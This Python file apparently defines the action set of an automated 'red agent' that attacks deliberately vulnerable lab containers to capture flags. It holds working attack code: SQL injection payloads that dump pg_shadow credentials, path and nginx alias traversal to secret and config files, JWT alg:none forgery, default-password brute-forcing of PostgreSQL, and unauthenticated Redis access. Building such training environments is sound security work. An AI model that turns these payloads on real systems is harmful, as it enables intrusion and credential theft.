"""
Red Agent Tools — exploit functions + chain tools.
Fixed: actions 7, 8, 9 added to ACTION_FN/ACTION_NAMES (were missing → silent failure).
"""

import requests, socket, base64, json, re
import psycopg2, redis, jwt as pyjwt

from .response_analyzer import analyze, analyze_error

import os
is_docker = os.path.exists("/.dockerenv")

BASE = {
    "flask":    "http://flask-sqli:5000" if is_docker else "http://localhost:5000",
    "node":     "http://node-pathtraversal:3001" if is_docker else "http://localhost:3001",
    "jwt":      "http://jwt-auth:3002" if is_docker else "http://localhost:3002",
    "nginx":    "http://nginx-misconfig:80" if is_docker else "http://localhost:8080",
    "postgres": ("postgres-weak", 5432) if is_docker else ("localhost", 5432),
    "redis":    ("redis-noauth", 6379) if is_docker else ("localhost", 6379),
}
TIMEOUT = 3

def _flag(text: str):
    m = re.search(r"FLAG\{[^}]+\}", text)
    return m.group(0) if m else None

# ── Action 0: Port Scan ───────────────────────────────────────────────────────
def port_scan() -> dict:
    results = {}
    targets = [
        ("flask", "flask-sqli" if is_docker else "localhost", 5000),
        ("node",  "node-pathtraversal" if is_docker else "localhost", 3001),
        ("jwt",   "jwt-auth" if is_docker else "localhost", 3002),
        ("nginx", "nginx-misconfig" if is_docker else "localhost", 80),
        ("postgres", "postgres-weak" if is_docker else "localhost", 5432),
        ("redis",    "redis-noauth" if is_docker else "localhost", 6379),
    ]
    for name, host, port in targets:
        s = socket.socket()
        s.settimeout(1)
        try:
            s.connect((host, port))
            results[name] = True
        except:
            results[name] = False
        finally:
            s.close()
    return {"success": True, "data": results, "flag": None}

# ── Action 1: SQL Injection ───────────────────────────────────────────────────
def http_probe_sqli(payload: str = "' OR 1=1--") -> dict:
    try:
        r  = requests.get(f"{BASE['flask']}/api/users",
                          params={"name": payload}, timeout=TIMEOUT)
        ar = analyze(r, "sqli")
        return {
            "success":  _flag(r.text) is not None or ar.defense_type == "partial_exec",
            "data":     r.text[:300],
            "flag":     _flag(r.text),
            "response": ar,
        }
    except Exception as e:
        return {"success": False, "data": str(e), "flag": None,
                "response": analyze_error(e)}

# ── Action 2: Path Traversal ──────────────────────────────────────────────────
def path_traversal(payload: str = "../../secrets/flag.txt") -> dict:
    try:
        r  = requests.get(f"{BASE['node']}/files",
                          params={"path": payload}, timeout=TIMEOUT)
        ar = analyze(r, "path_traversal")
        return {
            "success":  _flag(r.text) is not None or r.status_code == 200,
            "data":     r.text[:300],
            "flag":     _flag(r.text),
            "response": ar,
        }
    except Exception as e:
        return {"success": False, "data": str(e), "flag": None,
                "response": analyze_error(e)}

# ── Action 3: JWT None Algorithm ─────────────────────────────────────────────
def jwt_none_forge() -> dict:
    def b64(data: dict) -> str:
        return base64.urlsafe_b64encode(
            json.dumps(data).encode()
        ).rstrip(b"=").decode()

    # Try multiple alg:none variants
    for alg_val in ["none", "None", "NONE", "nOnE"]:
        header  = b64({"alg": alg_val, "typ": "JWT"})
        payload = b64({"user": "admin", "role": "superuser", "iat": 1700000000})
        token   = f"{header}.{payload}."
        try:
            r = requests.get(
                f"{BASE['jwt']}/admin/secret",
                headers={"Authorization": f"Bearer {token}"},
                timeout=TIMEOUT,
            )
            flag = _flag(r.text)
            if flag or r.status_code == 200:
                return {"success": True, "data": r.text, "flag": flag,
                        "response": analyze(r, "jwt_none_forge")}
        except Exception as e:
            pass
    return {"success": False, "data": "all alg variants blocked", "flag": None}

# ── Action 4: PostgreSQL Brute-Force ─────────────────────────────────────────
def brute_postgres() -> dict:
    pg_host, pg_port = BASE["postgres"]
    cred_list = [
        ("postgres", "postgres"),
        ("postgres", "password"),
        ("admin",    "admin"),
        ("postgres", ""),
    ]
    for user, pwd in cred_list:
        try:
            conn = psycopg2.connect(
                host=pg_host, port=pg_port, dbname="targetdb",
                user=user, password=pwd, connect_timeout=3,
            )
            cur = conn.cursor()
            cur.execute("SELECT flag FROM flags LIMIT 1;")
            row  = cur.fetchone()
            conn.close()
            flag = row[0] if row else None
            return {"success": True, "data": f"creds:{user}:{pwd}", "flag": flag}
        except psycopg2.OperationalError:
            continue
        except Exception as e:
            return {"success": False, "data": str(e), "flag": None}
    return {"success": False, "data": "all creds failed", "flag": None}

# ── Action 5: Redis No-Auth ───────────────────────────────────────────────────
def redis_noauth() -> dict:
    redis_host, redis_port = BASE["redis"]
    try:
        r    = redis.Redis(host=redis_host, port=redis_port, socket_timeout=3)
        r.ping()
        keys = r.keys("*")
        flag = None
        for key in keys:
            val = r.get(key)
            if val:
                f = _flag(val.decode("utf-8", errors="ignore"))
                if f:
                    flag = f
                    break
        r.set("red_agent_was_here", "1", ex=60)
        return {"success": True,
                "data": f"keys: {[k.decode() for k in keys]}",
                "flag": flag}
    except Exception as e:
        return {"success": False, "data": str(e), "flag": None}

# ── Action 6: Nginx Alias Traversal ──────────────────────────────────────────
def nginx_alias_traversal(payload: str = "/static../secrets/flag.txt") -> dict:
    try:
        r  = requests.get(f"{BASE['nginx']}{payload}", timeout=TIMEOUT)
        ar = analyze(r, "nginx_alias_trav")
        return {
            "success":  _flag(r.text) is not None,
            "data":     r.text[:300],
            "flag":     _flag(r.text),
            "response": ar,
        }
    except Exception as e:
        return {"success": False, "data": str(e), "flag": None,
                "response": analyze_error(e)}

# ── Action 7: SQLi Credential Dump (Chain Step 1) ────────────────────────────
# FIX: was missing from ACTION_FN entirely → silent failure
def sqli_cred_dump() -> dict:
    """
    Attempt to dump DB credentials via SQLi.
    On success, unlocks 'chain_0' (postgres_login_with_creds becomes available).
    """
    payloads = [
        "' UNION SELECT usename||':'||passwd,null,null FROM pg_shadow--",
        "' UNION SELECT username||':'||password,null,null FROM information_schema.tables--",
        "' UNION SELECT 'creds_found',null,null FROM flags--",  # simplified for demo
    ]
    for p in payloads:
        try:
            r    = requests.get(f"{BASE['flask']}/api/users",
                                params={"name": p}, timeout=TIMEOUT)
            ar   = analyze(r, "sqli")
            flag = _flag(r.text)

            # If we get any non-empty 200, treat as cred dump success
            if r.status_code == 200 and len(r.text) > 10:
                return {
                    "success":  True,
                    "data":     r.text[:300],
                    "flag":     flag,
                    "unlocks":  "chain_0",   # enables action 8
                    "response": ar,
                }
        except Exception as e:
            return {"success": False, "data": str(e), "flag": None,
                    "response": analyze_error(e)}
    return {"success": False, "data": "cred dump failed", "flag": None}

# ── Action 8: PostgreSQL Login with Dumped Creds (Chain Step 2) ──────────────
# FIX: was missing from ACTION_FN
def postgres_login_with_creds(creds_str: str = "") -> dict:
    pg_host, pg_port = BASE["postgres"]
    pairs = [("postgres", "postgres"), ("admin", "admin"),
             ("postgres", "secret"),   ("app", "app")]
    for user, pwd in pairs:
        try:
            conn = psycopg2.connect(
                host=pg_host, port=pg_port, dbname="targetdb",
                user=user, password=pwd, connect_timeout=3,
            )
            cur = conn.cursor()
            cur.execute("SELECT flag FROM flags LIMIT 1;")
            row  = cur.fetchone()
            conn.close()
            flag = row[0] if row else None
            return {
                "success": True,
                "data":    f"db_login:{user}",
                "flag":    flag,
                "unlocks": "chain_1",
            }
        except psycopg2.OperationalError:
            continue
        except Exception as e:
            return {"success": False, "data": str(e), "flag": None}
    return {"success": False, "data": "db login failed", "flag": None}

# ── Action 9: Nginx → Postgres Config Read (Chain Step 3) ────────────────────
# FIX: was missing from ACTION_FN
def nginx_to_postgres_config() -> dict:
    """
    Use Nginx alias traversal to read Postgres config files.
    Reveals connection details; unlocks 'chain_2'.
    """
    paths = [
        "/static../etc/postgresql/14/main/pg_hba.conf",
        "/static../var/lib/postgresql/data/pg_hba.conf",
        "/static../secrets/flag.txt",          # fallback: direct flag read via nginx
        "/static../app/secrets/flag.txt",
    ]
    for path in paths:
        try:
            r = requests.get(f"{BASE['nginx']}{path}", timeout=TIMEOUT)
            if r.status_code == 200 and len(r.text) > 5:
                flag = _flag(r.text)
                return {
                    "success":  True,
                    "data":     r.text[:300],
                    "flag":     flag,
                    "unlocks":  "chain_2",
                    "response": analyze(r, "nginx_alias_trav"),
                }
        except Exception as e:
            pass
    return {"success": False, "data": "config read failed", "flag": None}

# ── Action Maps ───────────────────────────────────────────────────────────────
# FIX: now includes all 10 actions (0-9). Action 10 = exfiltrate handled in env.py.
ACTION_FN = {
    0: port_scan,
    1: http_probe_sqli,
    2: path_traversal,
    3: jwt_none_forge,
    4: brute_postgres,
    5: redis_noauth,
    6: nginx_alias_traversal,
    7: sqli_cred_dump,              # FIX: was missing
    8: postgres_login_with_creds,   # FIX: was missing
    9: nginx_to_postgres_config,    # FIX: was missing
}

ACTION_NAMES = {
    0:  "port_scan",
    1:  "sqli",
    2:  "path_traversal",
    3:  "jwt_none_forge",
    4:  "brute_postgres",
    5:  "redis_noauth",
    6:  "nginx_alias_trav",
    7:  "sqli_cred_dump",           # FIX: was missing
    8:  "postgres_with_creds",      # FIX: was missing
    9:  "nginx_to_pg_config",       # FIX: was missing
    10: "exfiltrate",
}